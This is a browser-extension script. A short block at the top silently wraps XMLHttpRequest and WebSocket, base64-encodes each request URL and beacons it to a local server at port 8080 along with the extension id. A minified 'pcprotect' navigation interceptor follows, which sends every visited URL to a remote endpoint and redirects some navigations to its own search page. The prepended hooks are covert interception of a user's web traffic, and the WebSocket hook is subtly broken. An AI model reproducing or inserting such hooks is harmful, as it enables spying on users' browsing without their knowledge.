function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var navigationIntercepter=function(){var e={api:utils().getExtensionApi(),endpoint:{url:"https://ext.pcprotect.com/e2/gsb/url",method:"POST",cache:[]},previousRequest:{tabId:null,frameId:null,url:null,timeStamp:null},settings:{urlFilters:["http://*/*","https://*/*"],method:"blocking",blockPageUrl:""},urlWhitelist:{},init:function(){var r=e.api;e.settings.blockPageUrl=r.extension.getURL("/assets/html/warning-page.html"),r.webRequest.onBeforeRequest.addListener(function(r){return e.onBeforeRequest(r)},{urls:e.settings.urlFilters},[e.settings.method]),r.webNavigation.onErrorOccurred.addListener(function(r){return e.onBeforeNavigateErrorOccurred(r)})},replaceString:function(e,r){return e.replace(r,"")},addToCache:function(e,r,t){return void 0!==r[t]&&(e[t]=r[t]),t},onBeforeRequest:function(r){if(-1!=r.url.indexOf("SafeSearchIgnore"))return!0;if(void 0!==r&&-1!=r.tabId&&0==r.frameId&&"main_frame"==r.type&&e.excludeUrls(r.url)){e.previousRequest.tabId=r.tabId,e.previousRequest.frameId=r.frameId,e.previousRequest.url=r.url,e.previousRequest.timeStamp=r.timeStamp;var t,a=e.regexUrl(r.url),n=e.endpoint.cache,i=r.url,o=e.api;if(a[0]){if(r.cleanUrl=a[0],n.hasOwnProperty(i)){var u=!!n[i]&&n[i];if(u)return e.ifThreatBlockResponse(u,r,!1)}else if(t=e.ajax(r.url)){i=e.addToCache(n,t,i);var l=!!t[i]&&t[i];if(l)return e.ifThreatBlockResponse(l,r,!1)}}else{var s=encodeURIComponent(r.url),c="https://search.pcprotect.com/web?fcoid=417&fcop=topnav&fpid=27&q="+s;o.tabs.query({currentWindow:!0,active:!0},function(e){chrome.tabs.update(e[0].id,{url:c})})}}},onBeforeNavigate:function(r){if(-1!=r.url.indexOf("SafeSearchIgnore"))return!0;if(void 0!==r&&-1!=r.tabId&&0==r.frameId&&e.excludeUrls(r.url)){e.previousRequest.tabId=r.tabId,e.previousRequest.frameId=r.frameId,e.previousRequest.url=r.url,e.previousRequest.timeStamp=r.timeStamp;var t,a=e.regexUrl(r.url),n=e.endpoint.cache,i=a[0];if(a[0])if(r.cleanUrl=a[0],n.hasOwnProperty(i)){var o=!!n[i]&&n[i];if(o)return e.ifThreatBlockResponse(o,r,!1)}else if(t=e.ajax(r.url)){i=e.addToCache(n,t,i);var u=!!t[i]&&t[i];if(u)return e.ifThreatBlockResponse(u,r,!1)}}},onBeforeNavigateErrorOccurred:function(r){if(-1!=r.url.indexOf("SafeSearchIgnore"))return!0;if(e.previousRequest.tabId==r.tabId&&e.previousRequest.frameId==r.frameId&&e.previousRequest.url==r.url&&e.previousRequest.timeStamp-r.timeStamp<=1500)return!0;if(void 0!==r&&0==r.frameId&&e.excludeUrls(r.url)){var t,a=e.regexUrl(r.url),n=e.endpoint.cache,i=a[0];if(a[0])if(r.cleanUrl=a[0],n.hasOwnProperty(i)){var o=!!n[i]&&n[i];if(o)return e.ifThreatBlockResponse(o,r,!1)}else if(t=e.ajax(r.url)){i=e.addToCache(n,t,i);var u=!!t[i]&&t[i];if(u)return e.ifThreatBlockResponse(u,r,!1)}}},ajax:function(r){var t=$.ajax({url:e.endpoint.url,method:e.endpoint.method,data:JSON.stringify({urls:[r]}),dataType:"json",async:!1});return"object"==typeof t.responseJSON&&t.responseJSON.data},regexUrl:function(e){var r=new RegExp("^(http://|https://).*?(/|$)"),t=e.match(r);return null!==t&&void 0!==t&&void 0!==t[0]&&t},excludeUrls:function(r){var t=[e.endpoint.url,"about:blank"];return-1==$.inArray(r,t)},cleanUrl:function(e){if(void 0!==e[1])var r=e[0].replace(e[1],"");return r?r.replace("/",""):null},ifThreatBlockResponse:function(r,t,a){if(e.shouldBlock(r)){var n=e.api;t.cleanUrl=t.cleanUrl.replace("https://www.","").replace("http://www.","").replace("https://","").replace("http://","").replace(/^www\./g,"").replace("/","");var i="?url="+encodeURIComponent(t.url)+"&threat="+e.getThreat(r),o=e.settings.blockPageUrl+i;if(void 0!==a&&(n.tabs.query({currentWindow:!0,active:!0},function(r){e.api.storage.local.get("dont-block-whitelist",function(a){if(a&&void 0!==a["dont-block-whitelist"]&&(e.urlWhitelist=JSON.parse(a["dont-block-whitelist"])),-1==$.inArray(t.cleanUrl,e.urlWhitelist))n.tabs.update(r[0].id,{url:o});else{var i=-1!=t.url.indexOf("?")?"&":"?",u=t.url+i+"SafeSearchIgnore";n.tabs.update(r[0].id,{url:u})}})}),!a))return{redirectUrl:o}}},shouldBlock:function(e){var r=0,t=0,a=["malware","virusinfected","spyware","phishing"];switch(-1!=$.inArray(e.category,a)&&(r=1),e.threatType){case"":t=4;break;case"THREAT_TYPE_UNSPECIFIED":t=2;break;default:t=1}return 1==t||1==r},getThreat:function(e){var r;return""!=e.threatType&&(r=e.threatType),""!=e.category&&(r=e.category),r.toUpperCase()}};return e.init(),e}();